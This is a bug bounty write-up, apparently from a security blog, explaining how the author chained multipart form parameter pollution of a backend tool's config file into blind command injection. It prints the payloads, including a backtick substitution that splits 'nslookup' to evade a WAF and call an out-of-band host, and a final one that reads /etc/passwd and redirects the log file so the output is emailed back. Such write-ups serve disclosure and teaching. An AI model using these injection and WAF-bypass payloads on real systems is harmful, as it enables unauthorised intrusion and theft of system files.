---                                                                                                                                                                                                                                   
layout: default
title:  "Backend Parameter Injection --> RCE"
date:   2023-03-14 11:02:21 0100
author: Sysdum
---  
## Background
After performing my recon on a private bug bounty program, I came across a pretty standard web form that accepted numerical values, performed some unknown calculations, and then emailed the results back to the user. It looked something like this example web form from ResearchGate:

![Web Form Example](/assets/param-rce-webform-example2.png)

This behavior piqued my interest as this was on a more obscure subdomain, it accepted a lot of variables, and probably passed input to something that wasn't designed for the web. The first thing I needed to do was generate a valid result with the tool so I could understand how it worked.

Using Burp Suite's Repeater, I submitted the form a few times and noted how each value was being passed.

After a few attempts with the many parameters, I finally got an email with output that looked like it originated from a command line tool. I get excited any time I see terminal output reflected anywhere in a web app. Chances are decent that there may be a command injection vulnerability if we can figure out how to smuggle a command to the back-end service.

![Email-Output](/assets/param-rce-email-output.jpg)

Any time I find an interesting application, I usually check if it is open-source so that I can better understand how it works. I googled the variable names and found a repository (let's call it CalcTool) on GitHub. After looking over the readme, I learned CalcTool reads a configuration file and generates output very similar to the email I received.

This raised several questions. Is this web application passing data directly to CalcTool's configuration file? If so, can I exploit its behavior somehow?

## CalcTool Code Review

I looked over the sample configuration file on GitHub and found that the form values lined up exactly with the variables on the web form. This confirmed my suspicion that the web app was passing input to CalcTool. 

My next goal was to determine if there was any dangerous functionality within CalcTool that I could hit from the web application. I decided to search for function calls that could execute a command such as exec, execv, and system. These calls are usually vulnerable to command injection if the attacker can pass improperly sanitized input to these functions.

After some time, I found exactly one system() call. It was in an email function that dynamically constructed the arguments from the CalcTool configuration file:

```plaintext
margs = "-s CalcTool Output: '" + jobtitle + "' " + email + " < LOGFILE"
System ("mail" + text)
```

The end result of these string operations is the following command:

```plaintext
mail -s 'CalcTool Output: job173' email@example.com < /path/to/LOGFILE
```

Unfortunately, I only had access to the email variable and the web application used a decent regular expression to filter out any useful special characters e.g. ( ` $ )

At this stage I knew the following:

*   The web application passes the web form values in a one-to-one fashion to CalcTool's config file.
*   There is only one form value that I control that is passed to a system() call within CalcTool, which is my best chance at exploitation.

The goal was to find a way to pass input that I controlled directly to that system call

## Polluting the Configuration

Bypassing filters can be tricky. In web application testing, one common filter bypass technique is parameter pollution.

PortSwigger defines parameter pollution as:

"HTTP Parameter Pollution tests the application's response to receiving multiple HTTP parameters with the same name; for example, if the parameter username is included in the GET or POST parameters twice.

Supplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways. By exploiting these effects, an attacker may be able to bypass input validation, trigger application errors or modify internal variables values."

Now that we know what parameter pollution is, let's talk about the form itself for a moment. I knew the web application accepts values as *multipart form-data*. If you are not familiar with multi-part form data, it is a way of encoding POST data in a way that the web server can easily parse and understand. I see it often with file upload forms as the contents do not have to be URL encoded. Here is an example of a multi-part form courtesy of ResearchGate:

![Example Multipart Form](/assets/param-rce-multipart.png)

You will see that each field is separated by a boundary that is usually "------------------NUMBER". Calctool's web form used this format to separate the fields.

Now, if the web application was writing raw values into a CalcTool configuration file, then what would happen if a variable were defined more than once? Could I possibly pollute back-end parameters? Let's look at how the back-end tool reads these variables:

Here is a configuration file excerpt from the README:

```plaintext
Title "job title"
Email "email@example.com"
LOGFILE "log.txt"
Parameter_a 10
Parameter_b 1.4
...
Parameter_n 33.4
```

It is a simple text file with a parameter followed by a value on each line. There was no way for me to set the Title or Logfile variables using the web form. 

So I decided to apply the concept of HTTP parameter pollution to the configuration file by attempting to pollute the job title variable using one of the numeric form values I had control over. To do this I added a new line character after the numeric value and inserted a TITLE variable just below it. Instead of the form value looking like this:

```plaintext
-------------------------384837281
Content-Disposition: form-data; name="frequency"

10
-------------------------384837281
```

It would look like this:

```plaintext
-------------------------384837281
Content-Disposition: form-data; name="frequency"

10
Title "polluted"
-------------------------384837281
```

Instead of setting the frequency value of 10, we would set the frequency to 10 AND the Title to "polluted". I had hoped that the web application would write the output directly to the configuration file. Thus if the attack was successful, I would be able to set the title parameter to the word "polluted", then the subject of my email should read "CalcTool Output: Polluted" instead of the normal "JobOutput\_1948333".


After adding the new line and Title variable in Burp's repeater, I sent a request that would result in the config file below:

```plaintext
Title "jobid12"
Parameter_a 10
Parameter_b 1.4
Range 300
Frequency 10
Title "polluted"
```

For this to work, the application would need to keep **only** the **last** declaration of the title variable instead of keeping the first declaration. I then used BurpSuite's intercept feature to catch the form and add the polluted variable on a new line. I received the following email:

![Polluted Job](/assets/param-rce-job-polluted.jpg)

This output means that the pollution worked!

## Command Execution
The next step was to prove a command injection vulnerability. Due to the mail command not returning its output directly to me, this is a blind command injection. Therefore, I needed an out-of-band (OOB) method of exfiltrating data. I tried the following payload using Burp Collaborator:

```plaintext
-------------------------384837281
Content-Disposition: form-data; name="frequency"

10
Title "$(nslookup mycollaborator.com)"
-------------------------384837281
```

After sending the request and editing it with Burp, this time I was met with a 403 forbidden status from the web server. After trying a couple of other common payloads, I discovered that the application was behind a Web Application Firewall (WAF). 

It was configured to block most Linux commands and would not allow $() or {} at all.

However, backticks were allowed, which can be used for command substitution on Unix systems. So I tried the following variant:

```plaintext
...
-------------------------384837281
Content-Disposition: form-data; name="frequency"

10
Title `a=nslo;b=okup;$a$b mycollaborator.com`
...
```

This payload does the following:

*   Declares a variable and sets it to be the value “nslo”
*   Declares a variable b and sets it to be the value “okup”
*   Runs the command $a$b which combines a and b to form the nslookup command. Then I simply passed it mycollaborator.com (a placeholder for the actual collaborator URL) in order to get my lookup.

After checking my collaborator client, I saw a new lookup from my target's IP address. This means my blind command injection worked. However, I needed to exfiltrate data in order to prove remote code execution. To accomplish this, I needed to pollute one more variable: LOGFILE. This is where CalcTool reads input in order to email the results to the user. 

```plaintext
...
-------------------------384837281
Content-Disposition: form-data; name="frequency"

10
Title `a=ca;b=t;$a$b /e*c/pa*s*d > /tmp/synack77`
LOGFILE /tmp/synack77 
...
```

### Here is a breakdown of the final exploit chain:

*   CalcTool's configuration file allows for the definition of a log file.
*   The email function I showed earlier reads this log into the body of the email in order to send the results back to the user.
*   I needed to pollute the title parameter with a payload to write command results to a file.
*   Then I required a way to send the results back to me, so I polluted the logfile parameter to the command result file.
*   The results of the calculations would be overwritten by my command, and then the mail command would email me the results of my command

![Final Payload](/assets/param-rce-final-payload.png)

Here is how the payload looks when it is ran by CalcTool:
```plaintext
mail -s "CalcTool Output: `a=ca;b=t;$a$b /e*c/pa*s*d > /tmp/synack77`" email@gmail.com < /tmp/synack77
```

The command within the backticks is executed before the mail command is run. Therefore, the output of our command will be stored in /tmp/synack77 before the mail command runs and we get an email with the results of our command. In this case, we are reading /etc/passwd. 

Finally, I received an email with results of the cat /etc/passwd command:

![Payload Contents](/assets/param-rce-email-output-passwd.jpg)


Thanks for reading!
